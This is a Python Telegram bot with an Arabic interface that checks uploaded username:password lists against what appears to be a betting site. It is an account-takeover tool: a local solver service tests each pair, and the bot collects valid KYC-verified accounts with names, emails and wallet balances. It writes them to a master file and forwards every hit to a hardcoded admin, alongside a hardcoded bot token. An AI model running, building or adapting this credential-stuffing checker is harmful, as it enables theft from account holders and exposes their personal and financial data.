import os
from dotenv import load_dotenv
load_dotenv()
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, time, asyncio, logging, json
import httpx
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode
from telegram.error import TelegramError

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])
log = logging.getLogger(__name__)

# ==================== CONFIG ====================
BOT_TOKEN = "8606519407:AAG6QxZbjypnFwkEuizU3yb5JDzmPCPWVoc"
ADMIN_ID  = 5196760604
SOLVER_URL = "http://127.0.0.1:8000"

WORK_DIR   = "/storage/emulated/0/DONBET/bot_work"
EXPORT_DIR = os.path.join(WORK_DIR, "exports")
MASTER_FILE = os.path.join(WORK_DIR, "verified_master.txt")
os.makedirs(WORK_DIR, exist_ok=True)
os.makedirs(EXPORT_DIR, exist_ok=True)

PAUSE_BETWEEN_ACCS = 0.5 # تم تقليل الوقت لأنه أصبح أسرع
active_jobs = {}

def add_to_master(acc):
    try:
        if os.path.exists(MASTER_FILE):
            with open(MASTER_FILE, 'r', encoding='utf-8') as f:
                if f"{acc['login']}:{acc['password']}" in f.read(): return False
        prof = acc['profile']; wall = acc['wallet']
        line = f"{acc['login']}:{acc['password']} | Name: {prof.get('FirstName')} {prof.get('LastName')} | Email: {prof.get('Email')} | Bal: {wall.get('Balance')} | KYC: True\n"
        with open(MASTER_FILE, 'a', encoding='utf-8') as f: f.write(line)
        return True
    except: return False

async def check_account(username, password):
    try:
        async with httpx.AsyncClient(timeout=45) as client:
            r = await client.post(f"{SOLVER_URL}/check_account", json={"username": username, "password": password})
            if r.status_code != 200: return None
            data = r.json()
            
            if not data.get("valid"): return {"status": "invalid"}
            
            profile = json.loads(data.get("profile", "{}"))
            wallet_arr = json.loads(data.get("wallet", "[]"))
            wallet = wallet_arr[0] if wallet_arr else {}
            
            return {"status": "valid", "login": username, "password": password, "profile": profile, "wallet": wallet}
    except: return None

class AsyncJob:
    def __init__(self, user_id, chat_id, accounts, bot):
        self.user_id, self.chat_id, self.accounts, self.bot = user_id, chat_id, accounts, bot
        self.stop_event = asyncio.Event()
        self.stats = {'checked': 0, 'valid': 0, 'verified': 0, 'start_time': time.time()}
        self.verified_list = []
        self.msg_id = None
        self.finished = False
        self.lock = asyncio.Lock()

    async def update_ui(self, force=False):
        if not self.msg_id: return
        async with self.lock:
            total, checked = len(self.accounts), self.stats['checked']
            if not force and checked % 3 != 0: return # تحديث كل 3 حسابات ليكون أسرع
            
            pct = (checked / total * 100) if total else 0
            filled = int(10 * pct / 100)
            bar = "█" * filled + "░" * (10 - filled)
            
            elapsed = time.time() - self.stats['start_time']
            speed = checked / elapsed if elapsed > 0 else 0
            remaining = total - checked
            eta_str = str(timedelta(seconds=int(remaining / speed))) if speed > 0 else "..."
            
            text = (
                f"⏳ <b>جاري الفحص...</b>\n"
                f"<code>[{bar}]</code> <b>{pct:.1f}%</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>تم:</b> {checked} / {total}\n"
                f"⏳ <b>المتبقي:</b> {remaining}\n"
                f"✅ <b>صالحة (دخلت):</b> {self.stats['valid']}\n"
                f"🔒 <b>محققة (KYC):</b> {self.stats['verified']}\n"
                f"⚡ <b>السرعة:</b> {speed:.2f} حساب/ث\n"
                f"⏱ <b>الوقت:</b> {eta_str}"
            )
            
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 إيقاف", callback_data="job_stop")]])
            if self.finished: kb = InlineKeyboardMarkup([[InlineKeyboardButton("📥 تحميل", callback_data="job_file")]])
                
            try:
                await self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.msg_id, text=text, parse_mode=ParseMode.HTML, reply_markup=kb)
            except TelegramError: pass

    async def run(self):
        for u, p in self.accounts:
            if self.stop_event.is_set(): break
            
            res = await check_account(u, p)
            self.stats['checked'] += 1
            
            if res and res['status'] == 'valid':
                self.stats['valid'] += 1
                if res["profile"].get("KYCStatus"):
                    self.stats['verified'] += 1
                    self.verified_list.append(res)
                    is_new = add_to_master(res)
                    
                    msg = (
                        f"🚨 <b>حساب محقق جديد!</b> {'(جديد)' if is_new else '(مكرر)'}\n"
                        f"👤 <code>{u}</code>\n🔑 <code>{p}</code>\n"
                        f"👨‍💼 {res['profile'].get('FirstName','')} {res['profile'].get('LastName','')}\n"
                        f"💰 {res['wallet'].get('Balance',0)} {res['wallet'].get('CurrencyId','')}"
                    )
                    try: await self.bot.send_message(chat_id=self.chat_id, text=msg, parse_mode=ParseMode.HTML)
                    except: pass
                    try: await self.bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode=ParseMode.HTML)
                    except: pass
            
            await self.update_ui()
            await asyncio.sleep(PAUSE_BETWEEN_ACCS)
            
        self.finished = True
        await self.update_ui(force=True)
        
        if self.verified_list:
            path = os.path.join(EXPORT_DIR, f"verified_{self.user_id}_{int(time.time())}.txt")
            with open(path, 'w', encoding='utf-8') as f:
                for acc in self.verified_list:
                    f.write(f"{acc['login']}:{acc['password']} | Name: {acc['profile'].get('FirstName')} | KYC: True\n")
            try:
                with open(path, 'rb') as f:
                    await self.bot.send_document(chat_id=self.chat_id, document=f, caption=f"🏁 انتهى. {len(self.verified_list)} محقق.")
            except: pass
        active_jobs.pop(self.user_id, None)

def kb_main(): return ReplyKeyboardMarkup([[KeyboardButton("📤 إرسال ملف")], [KeyboardButton("🛑 إيقاف")]], resize_keyboard=True)
def kb_admin(): return InlineKeyboardMarkup([[InlineKeyboardButton("📁 إرسال الماستر", callback_data="adm_master")], [InlineKeyboardButton("📊 إحصائيات", callback_data="adm_stats")]])

async def cmd_start(update, ctx):
    await update.message.reply_text("أرسل ملف الحسابات:", reply_markup=kb_main())
    if update.effective_user.id == ADMIN_ID: await update.message.reply_text("👑 الأدمن", reply_markup=kb_admin())

async def on_callback(update, ctx):
    q = update.callback_query; await q.answer()
    if q.data == "job_stop":
        job = active_jobs.get(q.from_user.id)
        if job: job.stop_event.set(); await q.message.reply_text("🛑 جاري الإيقاف...")
    elif q.data == "adm_master" and q.from_user.id == ADMIN_ID:
        if os.path.exists(MASTER_FILE):
            with open(MASTER_FILE, 'rb') as f: await q.message.reply_document(document=f, filename="verified_master.txt")
    elif q.data == "adm_stats" and q.from_user.id == ADMIN_ID:
        count = 0
        if os.path.exists(MASTER_FILE): count = len(open(MASTER_FILE).readlines())
        await q.message.reply_text(f"📊 إجمالي الماستر: {count}")

async def on_document(update, ctx):
    uid = update.effective_user.id
    if uid in active_jobs: return await update.message.reply_text("⚠️ لديك فحص شغال.")
    file = await ctx.bot.get_file(update.message.document.file_id)
    path = os.path.join(WORK_DIR, f"in_{uid}.txt"); await file.download_to_drive(path)
    accounts = []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            if ':' in line:
                p = line.strip().split(':', 1)
                if len(p) == 2 and p[0] and p[1]: accounts.append((p[0], p[1]))
    if not accounts: return
    msg = await update.message.reply_text(f"🚀 بدء فحص {len(accounts)} حساب...")
    job = AsyncJob(uid, update.effective_chat.id, accounts, ctx.bot)
    job.msg_id = msg.message_id; active_jobs[uid] = job; asyncio.create_task(job.run())

async def on_text(update, ctx):
    if update.message.text == "🛑 إيقاف":
        job = active_jobs.get(update.effective_user.id)
        if job: job.stop_event.set(); await update.message.reply_text("🛑 جاري الإيقاف...")

def main():
    try: asyncio.get_running_loop()
    except RuntimeError: asyncio.set_event_loop(asyncio.new_event_loop())
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print("✅ Bot Running.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__": main()
